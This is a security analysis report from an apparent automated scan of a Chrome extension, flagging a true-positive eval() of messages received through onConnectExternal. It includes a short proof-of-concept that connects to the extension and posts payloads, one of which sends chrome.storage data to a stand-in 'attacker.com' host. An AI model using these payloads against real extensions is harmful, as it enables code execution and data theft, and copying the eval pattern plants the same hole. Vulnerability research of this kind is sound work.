# CoCo Analysis: mnpiohgimhjcajegfkoenhhdjdgnfbhn

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_external_port_onMessage → eval_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mnpiohgimhjcajegfkoenhhdjdgnfbhn/opgen_generated_files/bg.js
Line 48: tainted detected!~~~in extension with eval_sink
from bg_external_port_onMessage to eval_sink

**Code:**

```javascript
// Background script - Entry point via onConnectExternal (line 1042)
chrome.runtime.onConnectExternal.addListener(function(connect) {
   var Ext2Web = connect;
   appPorts[++count] = { web: Ext2Web };
   var Ext2Helper = chrome.runtime.connectNative("ch.quickline.vision.chrome.plugin");
   Ext2Web.onMessage.addListener(onWebMessage(count, Ext2Helper)); // ← attacker can send messages
   Ext2Helper.onMessage.addListener(onNativeMessage(count, Ext2Web));
   Ext2Helper.onDisconnect.addListener(onDisconnected(count, Ext2Web));
});

// Message handler with eval vulnerability (line 972-974)
function onWebMessage(id, ext2helper) {
   return function(message) {
      var obj = eval(message); // ← EVAL SINK - attacker-controlled message executed
      var cmd = obj.cmd;
      var port = obj.port;
      console.log('ID = ' + id + ' send cmd = ' + cmd + ' to port = ' + port);
      // ... rest of command processing
   }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onConnectExternal

**Attack:**

```javascript
// From a whitelisted domain (e.g., https://quickline.ch) or external extension
// The extension uses onConnectExternal which allows external connections
var port = chrome.runtime.connect("mnpiohgimhjcajegfkoenhhdjdgnfbhn");

// Send malicious payload that will be eval'd
port.postMessage("alert(document.cookie);");
// or
port.postMessage("fetch('https://attacker.com/steal?data=' + JSON.stringify(chrome.storage))");
```

**Impact:** Arbitrary code execution in the extension's background context. An external attacker (from whitelisted domains in manifest.json like *.quickline.ch, localhost, etc., or other extensions) can execute arbitrary JavaScript code by sending a malicious message through chrome.runtime.connect(). The message is directly passed to eval() without any validation, allowing full control over the extension's execution context. This enables data exfiltration, privilege escalation, and complete compromise of the extension's functionality.
